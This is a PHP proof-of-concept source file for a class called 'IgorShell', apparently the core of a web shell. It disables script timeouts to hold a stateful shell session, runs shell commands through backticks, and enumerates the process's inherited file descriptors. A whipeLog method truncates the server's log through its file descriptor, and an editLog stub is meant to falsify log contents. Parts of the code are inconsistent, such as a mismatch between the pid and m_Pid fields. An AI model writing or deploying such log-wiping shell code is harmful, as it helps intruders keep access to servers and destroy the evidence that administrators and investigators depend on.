<?php

/*
 *	Fd PoC
 *	Author: Brian Heese
 *	Date: 05-08-2013
 */

// Disable timing out as we wish to facilitate a statefull shell session.
set_time_limit(0);

// TODO: Set debug info to false when releasing to production.
ini_set('error_reporting', E_ALL);
ini_set('display_errors', true);

class IgorShell {

	private $pid;
	private $nice;
	private $m_FileDescriptors;

	public function __construct() {
		$this->m_Pid 				= getmypid();
		$this->m_Nice 				= $this->getProcessNice();
		$this->m_FileDescriptors	= array();
	}

	/**
	 *	Fetch current process priority
	 *	0 is highest, thus the higher the number
	 *	the lower the priority of the process.
	 */
	private function getProcessNice ($pid = null) {

	    if (!$pid) {
	        $pid = $this->pid;
	    }
	    
	    // Execute ps -p [pid] -o %p %n in shell    
	    $res = `ps -p $pid -o "%p %n"`;
	    
	    // Fetch info we want from output    
	    preg_match ('/^\s*\w+\s+\w+\s*(\d+)\s+(\d+)/m', $res, $matches);
	    
	    // Return Pid and priority    
	    return array ('pid' => (isset ($matches[1]) ? $matches[1] : null), 'nice' => (isset ($matches[2]) ? $matches[2] : null));
	}

	/**
	 *	Method which enumerates all inherited file descriptors
	 *	and looks up all relevant info for each.
	 *	Dep: PHP >= 5.3.6
	 */
	private function getFileDescriptors(  ) {

		$it = new DirectoryIterator("glob:///proc/self/fd/*");
		foreach($it as $f) {

			$tmpArr = array();

			// Create resource from fd
			$tmpArr['fd'] 		= $fd = fopen("php://fd/" . $f->getFilename(), 'r+');

			// Determine type
		    $details 			= stream_get_meta_data($fd);
		    $tmpArr['type'] 	= $details['stream_type'];

		    // Determine Blocked / Non-Blocked state
		    $tmpArr['state'] 	= $details['blocked'];

		    // Determine uri
		    $tmpArr['uri'] 		= $details['uri'];

		    // fd mode
		    $tmpArr['mode']		= $details['mode'];

		    // Save
		    $this->m_FileDescriptors[ $f->getFilename() ] = $tmpArr;
		}	
	}

	public function printFileDescriptors(  ) {
		
		if(!$this->m_FileDescriptors)
			$this->getFileDescriptors();

		foreach ( $this->m_FileDescriptors as $id => $fd ) {
			echo 'FD #' . $id . ': ' . nl2br( print_r( $fd ) ) . '<br />';
		}
	}

	private function whipeLog( $fd = null ) {
		
		// Default fd for log
		if( $fd == null )
			$fd = $this->m_FileDescriptors['2'];

		// Truncate filesize to 0 & close resource
		ftruncate($fd, 0);
		fclose($fd);

		// TODO: Add verficication to check if whipe succeeded
	}

	/**
	 *	Method that reads contents of log file referenced by fd
	 *	performs some basic manipulations on the data and
	 *	overwrites the log with manipulated version.
	 */
	private function editLog( $fd = null ) {
		// TODO: implement me.
	}
}